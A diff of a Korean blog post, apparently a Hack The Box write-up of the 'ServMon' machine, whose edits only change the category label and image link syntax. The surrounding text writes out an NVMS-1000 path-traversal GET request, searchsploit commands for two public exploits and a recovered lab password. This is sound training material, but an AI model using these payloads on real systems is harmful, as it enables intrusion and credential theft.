@@ -2,7 +2,7 @@
 slug: "servmon"
 title: "servMon"
 date: 2026-07-10
-category: "HTB"
+category: "윈도우"
 tags: []
 excerpt: "/Users로 들어가 보니 `Nadine`과 `Nathan` 이라는 유저가 있고 각각 아래와 같은 내용으로 이뤄짐 ```sh #/Nadine/Confidential.txt…"
 readingTime: 7
@@ -57,14 +57,14 @@ Nadine
 벡터: NVMS-1000 Path Traversal → Credential Reuse
 명령어:
 80포트에 NVMS-1000이라는 서비스가 떠있음
-![[Pasted image 20260710215301.png]]
+![](assets/images/posts/Pasted%20image%2020260710215301.png)
 ~~~sh
 searchsploit -m hardware/webapps/47774.txt
 
 #아래와 같이 입력하면 된다고 함
 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
 ~~~
-![[Pasted image 20260710215456.png]]
+![](assets/images/posts/Pasted%20image%2020260710215456.png)
 그럼 앞서 나온 password 파일이 있을 법한 %2FUsers%2FNathan%2FDesktop%2FPasswords.txt 로 들어가면
 ```sh
 1nsp3ctTh3Way2Mars!
@@ -103,7 +103,7 @@ Lock down the NSClient Access - Complete
 #여기로 접속해보면 NSClient가 나옴
 https://10.129.3.43:8443/index.html
 ```
- ![[Pasted image 20260710223339.png]]
+ ![](assets/images/posts/Pasted%20image%2020260710223339.png)
 마침 여기도 취약점이 있다고 해서 46802.txt를 읽고 따라하는 걸로
 ```sh
 searchsploit -m windows/local/46802.txt
